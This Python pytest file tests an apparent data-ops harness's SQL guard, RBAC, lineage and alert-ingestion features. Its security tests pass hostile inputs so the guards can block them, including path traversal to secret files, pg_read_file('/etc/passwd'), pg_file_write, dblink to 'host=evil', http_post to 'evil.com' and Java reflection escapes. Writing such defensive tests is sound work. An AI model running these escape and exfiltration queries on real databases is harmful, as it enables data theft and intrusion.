from __future__ import annotations

import json
import shutil
import subprocess
import sys
from datetime import UTC, datetime
from pathlib import Path

import pytest
from pydantic import ValidationError

from src.adapters.alert_ingestion import (
    ingest_and_converge,
    ingest_dbt_run_results,
    ingest_text_alert,
)
from src.adapters.base import SparkRunResult
from src.adapters.lineage_adapter import LineageAdapter
from src.adapters.openlineage import (
    extract_openlineage_lineage,
    infer_dialect_from_namespace,
    normalize_dataset_name,
    parse_openlineage_fail_alerts,
)
from src.core.context import IncidentInput, RunState, ToolCall, UserContext
from src.core.policy import load_policies, resolve_policies
from src.core.project import discover_project
from src.core.shadow_verifier import (
    DefaultIntegrityOracle,
    ShadowOverlayVerifier,
    execute_pipeline_subset,
    touches_incremental_logic,
)
from src.core.worktree import RunWorktreeManager
from src.hooks.policy_rbac import PolicyRbacHook
from src.hooks.sql_guard import SqlGuardHook


def _state(role: str = "de", run_id: str = "run-i18-fix") -> RunState:
    return RunState(
        run_id=run_id,
        incident=IncidentInput(
            incident_id="INC-FIX-18",
            title="Interrogate finding regression",
            summary="Verify finding fix",
        ),
        user_context=UserContext(role=role),  # type: ignore[arg-type]
    )


def _sql_call(sql: str, *, engine: str | None = None) -> ToolCall:
    args: dict[str, object] = {"sql": sql}
    if engine is not None:
        args["engine"] = engine
    return ToolCall(id="q1", name="run_sql_readonly", arguments=args)


def test_unit1_f1_lakehouse_glob_traversal_and_relative_dir(tmp_path: Path) -> None:
    """F1: Block glob+.. traversal out of lakehouse and bind relative paths to configured lakehouse_dir."""
    ws = tmp_path / "ext_repo"
    data_lake = ws / "data_lake"
    data_lake.mkdir(parents=True)
    secret = tmp_path / "secret_outside.csv"
    secret.write_text("k,v\napi_key,SECRET\n", encoding="utf-8")

    relaxed = load_policies().model_copy(deep=True)
    relaxed.sql_guard.blocked_functions = ["read_text", "read_blob", "glob"]
    guard = SqlGuardHook(policies=relaxed, workspace_dir=ws, lakehouse_dir=data_lake)
    st = _state("de")

    assert (
        guard.on_pre_tool_use(
            st,
            _sql_call(f"SELECT * FROM '{data_lake}/*/../../secret_outside.csv' LIMIT 5"),
        ).action
        == "block"
    )
    assert (
        guard.on_pre_tool_use(
            st,
            _sql_call(
                f"SELECT * FROM read_csv('{data_lake}/*/../../secret_outside.csv') LIMIT 5"
            ),
        ).action
        == "block"
    )
    assert (
        guard.on_pre_tool_use(
            st,
            _sql_call("SELECT * FROM 'workspace/lakehouse/raw/orders.csv' LIMIT 5"),
        ).action
        == "block"
    )
    assert (
        guard.on_pre_tool_use(
            st,
            _sql_call("SELECT * FROM 'data_lake/orders.csv' LIMIT 5"),
        ).action
        == "allow"
    )


def test_unit1_f2_explain_analyse_limits_and_da_file_scan(tmp_path: Path) -> None:
    """F2: Enforce EXPLAIN ANALYSE, EXPLAIN (ANALYZE false), EXPLAIN ANALYZE limits, and DA file scans."""
    pg_policies = load_policies().model_copy(deep=True)
    pg_policies.sql_guard.sql_dialect = "postgres"
    pg_policies.pii_columns = ["customer_iban"]
    pg_policies.partitioned_tables = {"mart_revenue": ["event_date"]}
    pg_policies.roles["da"].allowed_tables = ["mart_revenue"]

    pg_guard = SqlGuardHook(policies=pg_policies, workspace_dir=tmp_path, dialect="postgres")
    pg_rbac = PolicyRbacHook(policies=pg_policies, workspace_dir=tmp_path, dialect="postgres")

    assert (
        pg_guard.on_pre_tool_use(
            _state("de"), _sql_call("EXPLAIN (ANALYSE) SELECT customer_iban FROM mart_revenue")
        ).action
        == "block"
    )
    assert (
        pg_rbac.on_pre_tool_use(
            _state("sre"), _sql_call("EXPLAIN (ANALYSE) SELECT customer_iban FROM mart_revenue")
        ).action
        == "block"
    )
    assert (
        pg_guard.on_pre_tool_use(
            _state("de"),
            _sql_call("EXPLAIN (ANALYZE false) SELECT * FROM mart_revenue"),
        ).action
        == "allow"
    )
    assert (
        pg_guard.on_pre_tool_use(
            _state("de"),
            _sql_call("EXPLAIN ANALYZE SELECT * FROM mart_revenue WHERE event_date = '2026-11-27' LIMIT 999"),
        ).action
        == "block"
    )

    dk_policies = load_policies().model_copy(deep=True)
    dk_rbac = PolicyRbacHook(policies=dk_policies, workspace_dir=tmp_path)
    for bad_da_sql in (
        "EXPLAIN ANALYZE SELECT * FROM read_json_objects('workspace/lakehouse/raw/orders.json')",
        "EXPLAIN SELECT * FROM parquet_metadata('workspace/lakehouse/raw/orders.parquet')",
        "EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM pg_read_file('/etc/passwd')",
    ):
        assert (
            dk_rbac.on_pre_tool_use(_state("da"), _sql_call(bad_da_sql)).action == "block"
        ), bad_da_sql


def test_unit1_f3_multi_dialect_escape_functions_and_spark_tables(tmp_path: Path) -> None:
    """F3: Block dangerous Postgres, Spark, and DuckDB escape functions and Spark format file tables."""
    pg_policies = load_policies().model_copy(deep=True)
    pg_policies.sql_guard.sql_dialect = "postgres"
    pg_guard = SqlGuardHook(policies=pg_policies, workspace_dir=tmp_path, dialect="postgres")
    sp_guard = SqlGuardHook(policies=pg_policies, workspace_dir=tmp_path, dialect="spark")
    dk_guard = SqlGuardHook(policies=load_policies(), workspace_dir=tmp_path, dialect="duckdb")
    de_st = _state("de")

    for sql in (
        "SELECT table_to_xml('silver_orders', false, true, '')",
        "SELECT database_to_xml(false, true, '')",
        "SELECT schema_to_xml('public', false, true, '')",
        "SELECT query_to_xml_and_xmlschema('SELECT 1', true, true, '')",
        "SELECT lo_get(12345)",
        "SELECT lo_put(12345, 0, 'x')",
        "SELECT pg_file_write('/tmp/pwn', 'x', false)",
        "SELECT pg_ls_archive_statusdir()",
        "SELECT dblink_connect_u('host=evil', 'SELECT 1')",
        "SELECT dblink_send_query('c', 'DROP TABLE t')",
    ):
        assert pg_guard.on_pre_tool_use(de_st, _sql_call(sql)).action == "block", sql

    for sql in (
        "SELECT reflect('java.lang.Runtime', 'getRuntime')",
        "SELECT java_method('java.lang.System', 'getenv', 'PATH')",
        "SELECT * FROM parquet.`secret.parquet`",
    ):
        assert sp_guard.on_pre_tool_use(de_st, _sql_call(sql, engine="spark")).action == "block", sql

    for sql in (
        "SELECT * FROM postgres_query('pg', 'SELECT 1')",
        "SELECT * FROM mysql_query('my', 'SELECT 1')",
        "SELECT http_post('http://evil.com', 'data')",
    ):
        assert dk_guard.on_pre_tool_use(de_st, _sql_call(sql)).action == "block", sql


def test_unit1_f4_sre_agg_mode_pii_and_group_by_positional(tmp_path: Path) -> None:
    """F4: Block CTE/derived header PII aliases, UNION WITH, json_agg, ORDER BY PII; allow GROUP BY 1."""
    pg_policies = load_policies().model_copy(deep=True)
    pg_policies.sql_guard.sql_dialect = "postgres"
    pg_policies.pii_columns = ["email", "customer_iban"]
    pg_policies.partitioned_tables = {"mart_revenue": ["event_date"], "silver_orders": ["order_date"]}

    pg_rbac = PolicyRbacHook(policies=pg_policies, workspace_dir=tmp_path, dialect="postgres")
    dk_rbac = PolicyRbacHook(policies=load_policies(), workspace_dir=tmp_path, dialect="duckdb")
    sp_rbac = PolicyRbacHook(policies=pg_policies, workspace_dir=tmp_path, dialect="spark")
    sre_st = _state("sre")

    for sql in (
        "WITH c(x) AS (SELECT customer_iban FROM mart_revenue WHERE event_date = '2026-11-27') SELECT x, COUNT(*) FROM c GROUP BY x",
        "SELECT x, COUNT(*) FROM (SELECT customer_iban FROM mart_revenue WHERE event_date = '2026-11-27') AS t(x) GROUP BY x",
        "WITH c AS (SELECT email AS x FROM silver_users) SELECT x, COUNT(*) FROM c GROUP BY x UNION ALL SELECT 'a', 1",
        "SELECT json_agg(account_id) FROM mart_revenue WHERE event_date = '2026-11-27'",
        "SELECT json_object_agg(account_id, revenue_usd) FROM mart_revenue WHERE event_date = '2026-11-27'",
        "SELECT COUNT(*) FROM silver_users ORDER BY MIN(email)",
    ):
        assert pg_rbac.on_pre_tool_use(sre_st, _sql_call(sql)).action == "block", sql

    assert (
        sp_rbac.on_pre_tool_use(
            sre_st,
            _sql_call(
                "SELECT collect_set(account_id) FROM mart_revenue WHERE event_date = '2026-11-27'",
                engine="spark",
            ),
        ).action
        == "block"
    )
    assert (
        dk_rbac.on_pre_tool_use(
            sre_st,
            _sql_call("SELECT order_date, COUNT(*) FROM silver_orders WHERE order_date = '2026-01-01' GROUP BY 1"),
        ).action
        == "allow"
    )


def test_unit1_f5_sql_and_f13_partitions_and_union_with(tmp_path: Path) -> None:
    """F5-SQL & F13: Qualified partitioned_tables keys, empty partition lists, and WITH+UNION policy."""
    policies = load_policies().model_copy(deep=True)
    policies.sql_guard.sql_dialect = "postgres"
    policies.partitioned_tables = {"marts.mart_revenue": ["event_date"], "fct_mrr": []}
    guard = SqlGuardHook(policies=policies, workspace_dir=tmp_path, dialect="postgres")
    de_st = _state("de")

    for bad_sql in (
        "SELECT * FROM marts.mart_revenue LIMIT 10",
        "SELECT * FROM analytics.marts.mart_revenue LIMIT 10",
        "SELECT * FROM mart_revenue LIMIT 10",
    ):
        assert guard.on_pre_tool_use(de_st, _sql_call(bad_sql)).action == "block", bad_sql

    assert (
        guard.on_pre_tool_use(
            de_st,
            _sql_call("SELECT * FROM fct_mrr LIMIT 10"),
        ).action
        == "allow"
    )

    no_with = load_policies().model_copy(deep=True)
    no_with.sql_guard.allowed_top_level = ["SELECT", "UNION"]
    no_with_guard = SqlGuardHook(policies=no_with, workspace_dir=tmp_path)
    assert (
        no_with_guard.on_pre_tool_use(
            de_st,
            _sql_call("WITH c AS (SELECT 1) SELECT * FROM c UNION SELECT 2"),
        ).action
        == "block"
    )


def test_unit2_f5_alias_and_f7_policy_overrides(tmp_path: Path) -> None:
    """F5-alias & F7: Model alias propagation, role_overrides sql_scope ordering, uncompiled defaults, Jinja profiles, and manifest strictness."""
    # 1. Model alias propagation + case-insensitive partitioned_tables + shadow.backend fallback + role_overrides ordering.
    repo = tmp_path / "alias_repo"
    (repo / "models" / "marts").mkdir(parents=True)
    (repo / "target").mkdir(parents=True)
    (repo / "dbt_project.yml").write_text(
        "name: app\nprofile: app\nmodel-paths: ['models']\n", encoding="utf-8"
    )
    (repo / "profiles.yml").write_text(
        "app:\n"
        "  target: dev\n"
        "  outputs:\n"
        "    dev:\n"
        "      type: postgres\n"
        "      port: {{ env_var('PG_PORT', 5432) | int }}\n",
        encoding="utf-8",
    )
    manifest = {
        "metadata": {"adapter_type": "postgres"},
        "nodes": {
            "model.app.fct_orders_v2": {
                "name": "fct_orders_v2",
                "alias": "fct_orders",
                "schema": "analytics",
                "resource_type": "model",
                "original_file_path": "models/marts/fct_orders_v2.sql",
                "config": {"materialized": "table", "meta": {"partition_columns": ["order_date"]}},
                "depends_on": {"nodes": []},
                "columns": {"order_date": {}, "amount": {}},
            }
        },
        "sources": {},
        "macros": {},
    }
    (repo / "target" / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    (repo / "dataops-harness.yaml").write_text(
        "version: 1\n"
        "shadow:\n"
        "  backend: postgres\n"
        "governance:\n"
        "  partitioned_tables:\n"
        "    FCT_ORDERS_V2: [event_day]\n"
        "  role_overrides:\n"
        "    sre:\n"
        "      sql_scope: mart_only\n",
        encoding="utf-8",
    )

    project = discover_project(repo)
    assert project.sql_dialect == "postgres"
    lineage = LineageAdapter.from_project(project)
    policies = resolve_policies(project, lineage=lineage)

    # Case-insensitive partitioned_tables override replaces FCT_ORDERS_V2 without duplicates.
    assert "FCT_ORDERS_V2" in policies.partitioned_tables or "fct_orders_v2" in policies.partitioned_tables
    assert len([k for k in policies.partitioned_tables if k.lower() == "fct_orders_v2"]) == 1
    assert "fct_orders" in policies.roles["da"].allowed_tables
    assert "fct_orders" in policies.roles["sre"].allowed_tables

    rbac = PolicyRbacHook(policies=policies, workspace_dir=repo, dialect="postgres")
    guard = SqlGuardHook(policies=policies, workspace_dir=repo, dialect="postgres")
    assert (
        rbac.on_pre_tool_use(
            _state("da"),
            _sql_call("SELECT order_date FROM analytics.fct_orders WHERE order_date = '2026-11-27' LIMIT 5"),
        ).action
        == "allow"
    )
    assert (
        guard.on_pre_tool_use(
            _state("de"),
            _sql_call("SELECT * FROM analytics.fct_orders LIMIT 5"),
        ).action
        == "block"
    )

    # 2. Uncompiled external repo does not leak built-in sample tables/paths.
    uncompiled = tmp_path / "uncompiled_ext"
    (uncompiled / "models").mkdir(parents=True)
    (uncompiled / "dbt_project.yml").write_text("name: ext\n", encoding="utf-8")
    ext_proj = discover_project(uncompiled)
    ext_pol = resolve_policies(ext_proj)
    assert ext_pol.roles["da"].allowed_tables == []
    assert ext_pol.partitioned_tables == {}
    assert ext_pol.roles["sre"].allow_patch_paths == []

    # 3. shadow.backend=postgres without profile/manifest infers postgres dialect.
    ol_only = tmp_path / "shadow_dialect_only"
    ol_only.mkdir()
    (ol_only / "dataops-harness.yaml").write_text(
        "version: 1\nshadow:\n  backend: postgres\n", encoding="utf-8"
    )
    assert discover_project(ol_only).sql_dialect == "postgres"

    # 4. Top-level unknown key typo raises ValidationError instead of granting fix mode.
    typo_repo = tmp_path / "typo_repo"
    typo_repo.mkdir()
    (typo_repo / "dataops-harness.yaml").write_text(
        "version: 1\ndefault_resolution_mode: diagnosis_only\n", encoding="utf-8"
    )
    with pytest.raises(ValidationError):
        discover_project(typo_repo)


def test_unit2_f6_symlink_target_path_and_patchable_containment(tmp_path: Path) -> None:
    """F6: Block escaping symlinks, target-path traversal, model-paths traversal, and OL manifest whitelisting."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret_manifest.json").write_text(
        json.dumps({"metadata": {"adapter_type": "postgres"}, "nodes": {"m.x": {"name": "secret_tbl", "resource_type": "model"}}, "sources": {}, "macros": {}}),
        encoding="utf-8",
    )
    (outside / "evil.yaml").write_text("version: 1\ngovernance:\n  default_resolution_mode: fix\n", encoding="utf-8")
    (outside / "ev.jsonl").write_text(
        json.dumps({"eventType": "COMPLETE", "job": {"name": "j"}, "inputs": [], "outputs": [{"name": "out_tbl"}]}),
        encoding="utf-8",
    )

    # Symlinked dataops-harness.yaml outside repo root must fail boundary check.
    r1 = tmp_path / "sym_manifest"
    r1.mkdir()
    (r1 / "dataops-harness.yaml").symlink_to(outside / "evil.yaml")
    with pytest.raises(ValueError, match="escapes repository root"):
        discover_project(r1)

    # dbt_project.yml target-path escaping repo root must be rejected cleanly.
    r2 = tmp_path / "esc_target"
    (r2 / "models").mkdir(parents=True)
    (r2 / "dbt_project.yml").write_text(
        "name: r2\ntarget-path: '../outside'\nmodel-paths: ['../outside', '.']\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="escapes repository root"):
        discover_project(r2)

    # Symlinked spark/openlineage artifacts outside repo + PolicyRbacHook read symlink into logs/spark_events/.
    r3 = tmp_path / "sym_misc"
    (r3 / "models").mkdir(parents=True)
    (r3 / "logs" / "spark_events").mkdir(parents=True)
    (r3 / "logs" / "spark_events" / "secret.log").write_text("SECRET_SPARK_LOG\n", encoding="utf-8")
    (r3 / "models" / "harmless.sql").symlink_to(r3 / "logs" / "spark_events" / "secret.log")
    (r3 / "spark_jobs").symlink_to(outside)
    (r3 / "openlineage").mkdir()
    (r3 / "openlineage" / "ev.jsonl").symlink_to(outside / "ev.jsonl")
    (r3 / "openlineage" / "ok.jsonl").write_text(
        json.dumps(
            {
                "eventType": "COMPLETE",
                "job": {
                    "name": "ok_job",
                    "facets": {"sourceCodeLocation": {"path": "dataops-harness.yaml"}},
                },
                "inputs": [],
                "outputs": [{"name": "ok_tbl"}],
            }
        )
        + "\n",
        encoding="utf-8",
    )
    proj3 = discover_project(r3)
    assert proj3.spark_jobs_dir is None
    assert proj3.openlineage_paths == [(r3 / "openlineage" / "ok.jsonl").resolve()]
    assert "dataops-harness.yaml" not in proj3.discovered.patchable_paths

    rbac = PolicyRbacHook(policies=load_policies(), workspace_dir=r3)
    assert (
        rbac.on_pre_tool_use(
            _state("da"),
            ToolCall(id="r_sym", name="read_file", arguments={"path": "models/harmless.sql"}),
        ).action
        == "block"
    )


def test_unit2_f10_openlineage_uri_pii_layer_and_traversal() -> None:
    """F10: Normalize trailing-slash URIs, extensions, POSIX paths, non-PII dataops.columns, .. paths, layer override, and bare bigquery."""
    assert normalize_dataset_name("s3://bucket/warehouse/silver_orders/") == "silver_orders"
    assert normalize_dataset_name("s3://bucket/warehouse/orders.parquet") == "orders"
    assert normalize_dataset_name("/warehouse/silver/silver_orders") == "silver_orders"
    assert infer_dialect_from_namespace("bigquery") == "bigquery"

    fail_alerts = parse_openlineage_fail_alerts(
        {
            "eventType": "FAIL",
            "eventTime": "2026-11-27T10:00:00Z",
            "run": {"runId": "r1", "facets": {"errorMessage": {"message": "boom"}}},
            "job": {"namespace": "bigquery", "name": "build_silver_orders"},
            "inputs": [],
            "outputs": [{"namespace": "s3://bucket", "name": "s3://bucket/silver_orders/"}],
        }
    )
    assert len(fail_alerts) == 1
    assert fail_alerts[0].asset == "silver_orders"

    graph = extract_openlineage_lineage(
        [
            {
                "eventType": "COMPLETE",
                "job": {
                    "namespace": "dbt://app",
                    "name": "downstream_job",
                    "facets": {"sourceCodeLocation": {"path": "models/../../../etc/passwd"}},
                },
                "inputs": [{"name": "raw_tbl"}],
                "outputs": [{"name": "target_tbl"}],
            },
            {
                "eventType": "COMPLETE",
                "job": {"namespace": "dbt://app", "name": "upstream_promote"},
                "inputs": [],
                "outputs": [
                    {
                        "namespace": "bigquery",
                        "name": "target_tbl",
                        "facets": {
                            "dataops": {"layer": "mart", "columns": ["order_date", "amount"]},
                        },
                    }
                ],
            },
        ]
    )
    # Wait: here first event saw target_tbl as output (layer='external'), second event sets explicit dataops.layer='mart'.
    assert graph.nodes["target_tbl"].layer == "mart"
    assert graph.nodes["target_tbl"].pii_columns == []
    assert graph.nodes["target_tbl"].file_path is None
    assert graph.sql_dialect == "bigquery"


def test_unit2_f11_case_merge_dangling_upstream_and_spark_link(tmp_path: Path) -> None:
    """F11: Merge dbt/OL case-insensitively, tolerate dangling upstream, link config.meta upstream_spark_table, and separate source/model collisions."""
    repo = tmp_path / "case_repo"
    (repo / "dbt_project" / "target").mkdir(parents=True)
    (repo / "openlineage").mkdir(parents=True)
    (repo / "spark_jobs").mkdir(parents=True)
    (repo / "dbt_project" / "dbt_project.yml").write_text("name: c\n", encoding="utf-8")

    (repo / "spark_jobs" / "lineage.yaml").write_text(
        "assets:\n  ghost_child:\n    engine: spark\n    layer: silver\n    upstream: [nonexistent_raw]\n",
        encoding="utf-8",
    )
    (repo / "openlineage" / "ol.jsonl").write_text(
        "\n".join(
            [
                json.dumps(
                    {
                        "eventType": "COMPLETE",
                        "job": {"namespace": "spark://cluster", "name": "spark_silver_orders"},
                        "inputs": [{"name": "RAW_ORDERS"}],
                        "outputs": [{"name": "silver_orders"}],
                    }
                ),
                json.dumps(
                    {
                        "eventType": "COMPLETE",
                        "job": {"namespace": "dbt://c", "name": "build_fct_mrr"},
                        "inputs": [{"name": "RAW_ORDERS"}],
                        "outputs": [{"name": "FCT_MRR"}],
                    }
                ),
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    manifest = {
        "metadata": {"adapter_type": "duckdb"},
        "sources": {
            "source.c.raw.orders": {
                "name": "orders",
                "source_name": "raw",
                "schema": "raw",
                "resource_type": "source",
            }
        },
        "nodes": {
            "model.c.orders": {
                "name": "orders",
                "schema": "marts",
                "resource_type": "model",
                "original_file_path": "models/marts/orders.sql",
                "meta": {},
                "config": {"meta": {"upstream_spark_table": "silver_orders"}},
                "depends_on": {"nodes": ["source.c.raw.orders"]},
                "columns": {},
            },
            "model.c.fct_mrr": {
                "name": "fct_mrr",
                "schema": "marts",
                "resource_type": "model",
                "original_file_path": "models/marts/fct_mrr.sql",
                "depends_on": {"nodes": []},
                "columns": {},
            },
        },
        "macros": {},
    }
    (repo / "dbt_project" / "target" / "manifest.json").write_text(
        json.dumps(manifest), encoding="utf-8"
    )

    project = discover_project(repo)
    assert len([a for a in project.discovered.discovered_assets if a.lower() == "fct_mrr"]) == 1

    lineage = LineageAdapter.from_project(project)
    assert len([k for k in lineage.all_nodes() if k.lower() == "fct_mrr"]) == 1
    assert "silver_orders" in lineage.get_node("orders").upstream
    assert "raw.orders" in lineage.get_node("orders").upstream
    # Must not crash on dangling upstream IDs.
    sub = lineage.query_lineage("ghost_child", direction="upstream", depth=3)
    assert "ghost_child" in sub.nodes


def test_unit2_f12_alert_ingestion_unit_tests_aliases_and_batch_ts(tmp_path: Path) -> None:
    """F12: Support manifest unit_tests, manifestless generic test matching, text alias matching, and timestamp convergence."""
    repo = tmp_path / "alert_repo"
    (repo / "target").mkdir(parents=True)
    (repo / "dbt_project.yml").write_text("name: a\n", encoding="utf-8")
    manifest = {
        "metadata": {"adapter_type": "duckdb"},
        "nodes": {
            "model.a.fct_mrr_v2": {
                "name": "fct_mrr_v2",
                "alias": "fct_mrr",
                "schema": "marts",
                "resource_type": "model",
                "original_file_path": "models/marts/fct_mrr_v2.sql",
                "depends_on": {"nodes": ["model.a.stg_subs"]},
                "columns": {},
            },
            "model.a.stg_subs": {
                "name": "stg_subs",
                "schema": "staging",
                "resource_type": "model",
                "original_file_path": "models/staging/stg_subs.sql",
                "depends_on": {"nodes": []},
                "columns": {},
            },
        },
        "unit_tests": {
            "unit_test.a.fct_mrr_v2.test_positive_mrr": {
                "name": "test_positive_mrr",
                "resource_type": "unit_test",
                "depends_on": {"nodes": ["model.a.fct_mrr_v2"]},
            }
        },
        "sources": {},
        "macros": {},
    }
    (repo / "target" / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    lineage = LineageAdapter.from_workspace(repo)

    # 1. unit_tests in manifest["unit_tests"]
    rr_unit = {
        "metadata": {"invocation_id": "inv-1", "generated_at": "2026-11-27T10:00:00Z"},
        "results": [
            {
                "unique_id": "unit_test.a.fct_mrr_v2.test_positive_mrr",
                "status": "fail",
                "failures": 1,
                "message": "actual != expected",
            }
        ],
    }
    ut_alerts = ingest_dbt_run_results(rr_unit, manifest=manifest)
    assert len(ut_alerts) == 1
    assert ut_alerts[0].asset == "fct_mrr_v2"
    assert ut_alerts[0].metadata["test_name"] == "test_positive_mrr"

    # 2. Manifestless generic test matched against lineage node name
    rr_no_manifest = {
        "metadata": {"invocation_id": "inv-2", "generated_at": "2026-11-27T10:01:00Z"},
        "results": [
            {
                "unique_id": "test.a.not_null_fct_mrr_v2_billing_date.1234abcd",
                "status": "fail",
                "failures": 2,
                "message": "Got 2 nulls",
            }
        ],
    }
    no_man_alerts = ingest_dbt_run_results(rr_no_manifest, lineage=lineage)
    assert [a.asset for a in no_man_alerts] == ["fct_mrr_v2"]

    # 3. ingest_text_alert matches registered alias ('fct_mrr' -> 'fct_mrr_v2')
    txt_alerts = ingest_text_alert(
        "Finance alert: fct_mrr values dropped",
        lineage=lineage,
        timestamp=datetime(2026, 11, 27, 10, 2, tzinfo=UTC),
    )
    assert [a.asset for a in txt_alerts] == ["fct_mrr_v2"]

    # 4. ingest_and_converge anchors text alert to historical OpenLineage/dbt timestamps -> 1 Incident.
    ol_event = {
        "eventType": "FAIL",
        "eventTime": "2026-11-27T10:00:30Z",
        "run": {"runId": "ol-1", "facets": {"errorMessage": {"message": "stg failed"}}},
        "job": {"namespace": "dbt://a", "name": "build_stg_subs"},
        "inputs": [],
        "outputs": [{"name": "stg_subs"}],
    }
    alerts, incidents = ingest_and_converge(
        lineage=lineage,
        openlineage_events=ol_event,
        dbt_run_results=rr_unit,
        dbt_manifest=manifest,
        text="Finance alert: fct_mrr negative values",
    )
    assert len(alerts) == 3
    assert len(incidents) == 1
    assert incidents[0].root_cause_candidates == ["stg_subs"]


def _dbt_exe() -> str:
    venv_dbt = Path(sys.executable).parent / "dbt"
    return str(venv_dbt) if venv_dbt.exists() else (shutil.which("dbt") or "dbt")


def _init_git_repo(repo_dir: Path) -> None:
    subprocess.run(["git", "init", "-b", "main"], cwd=repo_dir, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_dir, check=True, capture_output=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.com"],
        cwd=repo_dir,
        check=True,
        capture_output=True,
    )
    subprocess.run(["git", "add", "."], cwd=repo_dir, check=True, capture_output=True)
    subprocess.run(["git", "commit", "-m", "baseline"], cwd=repo_dir, check=True, capture_output=True)


def test_unit3_f8_external_dbt_shadow_seed_spark_only_and_multi_upstream(tmp_path: Path) -> None:
    """F8: Redirect external DuckDB profile path, skip dbt on Spark-only repos, run dbt seed on seed patches, and preserve unmodified sibling silver tables."""
    dbt = _dbt_exe()

    # F8a: External dbt-duckdb repo with static profiles.yml path must verify cleanly into shadow dir.
    ext_repo = tmp_path / "ext_dbt_shadow"
    (ext_repo / "seeds").mkdir(parents=True)
    (ext_repo / "models" / "staging").mkdir(parents=True)
    (ext_repo / "models" / "marts").mkdir(parents=True)
    (ext_repo / "tests" / "marts").mkdir(parents=True)
    (ext_repo / "dbt_project.yml").write_text(
        'name: saas_billing\nversion: "1.0.0"\nconfig-version: 2\nprofile: saas_billing\n'
        'model-paths: ["models"]\nseed-paths: ["seeds"]\ntest-paths: ["tests"]\ntarget-path: "target"\n'
        "models:\n  saas_billing:\n    staging:\n      +materialized: view\n    marts:\n      +materialized: table\n",
        encoding="utf-8",
    )
    (ext_repo / "profiles.yml").write_text(
        "saas_billing:\n  target: dev\n  outputs:\n    dev:\n      type: duckdb\n      path: 'warehouse.duckdb'\n      threads: 1\n",
        encoding="utf-8",
    )
    (ext_repo / "seeds" / "raw_subs.csv").write_text(
        "subscription_id,billing_date,mrr_usd\ns1,2026-11-01,100.0\ns2,2026-11-02,-25.0\n",
        encoding="utf-8",
    )
    (ext_repo / "models" / "staging" / "stg_subs.sql").write_text(
        "SELECT subscription_id, CAST(billing_date AS VARCHAR) AS billing_date, CAST(mrr_usd AS DOUBLE) AS mrr_usd FROM {{ ref('raw_subs') }}\n",
        encoding="utf-8",
    )
    (ext_repo / "models" / "marts" / "fct_mrr.sql").write_text(
        "SELECT billing_date, ROUND(SUM(mrr_usd), 2) AS total_mrr_usd FROM {{ ref('stg_subs') }} GROUP BY billing_date\n",
        encoding="utf-8",
    )
    (ext_repo / "tests" / "marts" / "assert_positive_mrr.sql").write_text(
        "SELECT * FROM {{ ref('fct_mrr') }} WHERE total_mrr_usd <= 0\n",
        encoding="utf-8",
    )
    (ext_repo / "dataops-harness.yaml").write_text("version: 1\n", encoding="utf-8")
    (ext_repo / ".gitignore").write_text("target/\nlogs/\nwarehouse.duckdb*\n", encoding="utf-8")
    for cmd in (["seed"], ["run"]):
        proc = subprocess.run([dbt, "--no-version-check", *cmd, "--profiles-dir", "."], cwd=ext_repo, capture_output=True, text=True, check=False)
        assert proc.returncode == 0, proc.stderr or proc.stdout
    _init_git_repo(ext_repo)

    runs_ext = tmp_path / "runs_ext"
    wt_ext = RunWorktreeManager.create(ext_repo, runs_ext, "run-f8a")
    (wt_ext / "models" / "marts" / "fct_mrr.sql").write_text(
        "SELECT billing_date, ROUND(SUM(mrr_usd), 2) AS total_mrr_usd FROM {{ ref('stg_subs') }} WHERE mrr_usd > 0 GROUP BY billing_date\n",
        encoding="utf-8",
    )
    res_ext = ShadowOverlayVerifier(prod_workspace=ext_repo, runs_dir=runs_ext).verify("run-f8a", wt_ext)
    assert res_ext.passed is True, res_ext.failure_reasons
    assert res_ext.dbt_run_ok is True
    assert res_ext.dbt_test_ok is True
    assert not (wt_ext / "warehouse.duckdb").exists()

    # F8b: Spark-only repo skips dbt execution rather than failing without dbt_project.yml.
    sp_repo = tmp_path / "spark_only"
    (sp_repo / "spark_jobs").mkdir(parents=True)
    (sp_repo / "dataops-harness.yaml").write_text("version: 1\n", encoding="utf-8")
    (sp_repo / "spark_jobs" / "lineage.yaml").write_text(
        "assets:\n"
        "  raw_ev:\n    engine: raw\n    layer: raw\n    upstream: []\n"
        "  silver_ev:\n    engine: spark\n    layer: silver\n    job_path: spark_jobs/build_silver_ev.py\n    upstream: [raw_ev]\n",
        encoding="utf-8",
    )
    (sp_repo / "spark_jobs" / "build_silver_ev.py").write_text("x = 1\n", encoding="utf-8")
    _init_git_repo(sp_repo)

    class _OkSpark:
        def run_job(self, script_path: Path, args=None, **_kwargs):  # type: ignore[no-untyped-def]
            return SparkRunResult(
                job_name=script_path.stem,
                script_path=script_path,
                pid=1,
                returncode=0,
                duration_ms=1.0,
                event_log_path=None,
                stdout="ok",
                stderr="",
            )

    runs_sp = tmp_path / "runs_sp"
    wt_sp = RunWorktreeManager.create(sp_repo, runs_sp, "run-f8b")
    (wt_sp / "spark_jobs" / "build_silver_ev.py").write_text("x = 2\n", encoding="utf-8")
    res_sp = ShadowOverlayVerifier(
        prod_workspace=sp_repo,
        runs_dir=runs_sp,
        spark_runner=_OkSpark(),  # type: ignore[arg-type]
    ).verify("run-f8b", wt_sp)
    assert res_sp.passed is True, res_sp.failure_reasons
    assert res_sp.dbt_run_ok is True
    assert res_sp.dbt_test_ok is True

    # F8c: Patching a CSV inside seeds/ triggers `dbt seed` so shadow tables reflect seed changes.
    seed_repo = tmp_path / "seed_repo"
    (seed_repo / "seeds").mkdir(parents=True)
    (seed_repo / "models" / "marts").mkdir(parents=True)
    (seed_repo / "tests").mkdir(parents=True)
    (seed_repo / "dbt_project.yml").write_text(
        'name: seed_app\nversion: "1.0.0"\nconfig-version: 2\nprofile: seed_app\n'
        'model-paths: ["models"]\nseed-paths: ["seeds"]\ntest-paths: ["tests"]\ntarget-path: "target"\n'
        "models:\n  seed_app:\n    marts:\n      +materialized: table\n",
        encoding="utf-8",
    )
    (seed_repo / "profiles.yml").write_text(
        "seed_app:\n  target: dev\n  outputs:\n    dev:\n      type: duckdb\n      path: 'warehouse.duckdb'\n",
        encoding="utf-8",
    )
